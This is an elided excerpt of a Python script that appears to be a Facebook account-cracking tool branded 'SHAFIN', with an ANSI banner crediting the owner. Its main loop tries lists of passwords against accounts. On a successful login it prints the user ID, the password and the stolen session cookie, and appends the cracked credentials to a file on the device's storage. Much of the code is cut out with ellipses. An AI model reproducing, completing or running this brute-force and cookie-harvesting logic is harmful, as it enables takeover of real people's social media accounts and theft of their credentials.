...
ha = current.day
today = date.today()
#SHAFIN2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mSHAFIN')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-SHAFIN/1.2.0 OPN-B'
...
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mSHAFIN \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mSHAFIN \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/shafin.m.m.m')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio SHAFIN_OK.mp3")
                print('\033[1;92m[SHAFIN-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/SHAFIN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mSHAFIN","\x1b[1;92mSHAFIN","\x1b[1;93mSHAFIN","\x1b[1;94mSHAFIN","\x1b[1;95mSHAFIN","\x1b[1;96mSHAFIN","\x1b[1;97mSHAFIN","\x1b[1;91mSHAFIN","\x1b[1;92mSHAFIN","\x1b[1;93mSHAFIN","\x1b[1;94mSHAFIN","\x1b[1;95mSHAFIN","\x1b[1;96mSHAFIN"])
